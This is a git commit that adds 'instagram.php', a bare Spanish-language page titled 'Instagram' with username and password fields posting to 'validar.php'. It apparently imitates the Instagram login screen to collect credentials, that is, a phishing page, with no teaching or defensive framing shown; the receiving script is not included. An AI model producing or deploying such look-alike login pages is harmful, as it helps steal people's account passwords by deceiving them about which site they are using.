164504f5e40a02e0875dd236c3d23b63243ad006
LucasG32 <lucasg3322@gmail.com>
2020-11-05 19:05:16 -0300

    Create instagram.php

---
+++ lu/instagram.php
@@ -0,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="es" class="no-js not-logged-in client-root">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<link href="https://fonts.googleapis.com/css?family=Montserrat:300,400,600|Open+Sans" rel="stylesheet"> 
+	
+<link rel="stylesheet" href="css/eslito.css">
+
+        <title>
+Instagram
+</title>
+    </head>
+    <body>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <center>
+    <form action="validar.php" method="post">
+        <input type="text" name="nombre" class="input" placeholder="Telefono, usuario o correo <electronico></electronico>">
+        <br>
+        <input type="password" name="password" class="input" placeholder="contraseña">
+        <br>
+        <input type="submit">
+    </form>
+    </center>
+    </body>
+</html>
